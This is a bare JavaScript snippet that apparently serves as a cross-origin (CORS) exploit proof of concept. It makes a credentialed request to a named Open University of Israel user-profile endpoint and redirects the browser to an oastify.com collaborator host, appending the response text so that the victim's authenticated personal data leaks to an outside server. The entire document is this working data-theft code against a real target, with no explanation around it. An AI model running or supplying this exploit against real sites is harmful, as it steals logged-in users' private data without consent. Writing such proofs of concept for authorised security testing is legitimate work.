var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://opsrv.apps.openu.ac.il/MyOP/Person/HelloUser', true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location = '//0jkju313fs0ejqhs4mrm2zarrix9lz9o.oastify.com/log?key=' + this.responseText; 
};
